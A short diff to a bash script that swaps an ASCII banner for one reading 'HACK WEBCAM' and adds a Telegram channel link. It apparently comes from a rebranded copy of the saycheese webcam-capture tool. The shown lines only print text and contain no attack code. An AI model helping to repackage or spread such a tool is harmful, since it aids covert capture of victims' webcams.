@@ -8,11 +8,11 @@ trap 'printf "\n";stop' 2
 banner() {
 
 
-printf "\e[1;92m  ___𝗛𝗔𝗖𝗞 𝗪𝗘𝗕𝗖𝗔𝗠_     \e[0m\e[1;77m ____ _                          \e[0m\n"
-printf "\e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
-printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
-printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
-printf "\e[1;92m              |___/ \e[0m                                 \n"
+
+
+
+printf "\e[1;92m 𝙃𝘼𝘾𝙆 𝙒𝙀𝘽𝘾𝘼𝙈\e[0m\e   \e[0m\n"
+printf "\e[1;92m Canal telegram: T.me/HACKGM\e[0m                                 \n"
 
 printf " \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
 
